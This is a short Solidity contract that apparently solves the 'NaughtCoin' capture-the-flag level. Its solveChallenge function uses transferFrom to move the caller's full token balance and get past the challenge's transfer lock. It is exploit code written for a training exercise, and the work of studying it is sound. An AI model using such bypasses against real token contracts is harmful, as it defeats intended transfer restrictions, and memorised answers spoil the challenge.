// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./15NaughtCoin.sol";

contract NaughtCoinSolution {
    NaughtCoin public naughtCoin;

    constructor(address naughtCoinAddress) {
        naughtCoin = NaughtCoin(naughtCoinAddress);
    }

    function solveChallenge() public {
        naughtCoin.transferFrom(
            msg.sender,
            address(this),
            naughtCoin.balanceOf(msg.sender)
        );
    }
}
